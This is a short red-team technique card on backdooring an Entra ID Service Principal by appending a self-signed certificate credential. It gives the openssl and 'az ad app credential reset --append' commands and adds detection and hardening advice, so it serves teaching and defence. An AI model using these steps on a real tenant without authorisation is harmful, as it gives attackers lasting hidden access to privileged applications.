# [CA-TOKEN-022]: SP Certificate Token Forgery

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-TOKEN-022 |
| **MITRE ATT&CK v18.1** | [Unsecured Credentials: Private Keys (T1552.004)](https://attack.mitre.org/techniques/T1552/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Entra ID |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** If an attacker cannot steal the existing certificate but has `Application.ReadWrite.All` permissions, they can add a *new* credential (certificate or secret) to an existing Service Principal. This allows them to "backdoor" the application and authenticate as it, without knowing the original credentials.
- **Attack Surface:** Entra ID App Registrations.
- **Business Impact:** **Persistence**. Long-term backdoor into a privileged application.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Application Admin or Cloud Application Admin.
- **Tools:**
    - Azure CLI / PowerShell

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Generate Self-Signed Cert**
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
```

**Step 2: Add to SP**
```bash
az ad app credential reset --id <AppID> --append --cert @cert.pem
```

**Step 3: Authenticate**
(See CA-TOKEN-006)

## 5. DETECTION (Blue Team Operations)

#### 5.1 Entra ID Logs
| Source | Event | Filter Logic |
|---|---|---|
| **AuditLogs** | `Update application` | "Add service principal credential" where the actor is not the usual owner/pipeline. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Role Restriction:** Limit who holds `Application Administrator`. Prefer custom roles that can only manage specific apps.
*   **Monitoring:** Alert on any credential addition to high-privilege Service Principals.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-CLOUD-001]
> **Next Logical Step:** [LAT-CLOUD-001]
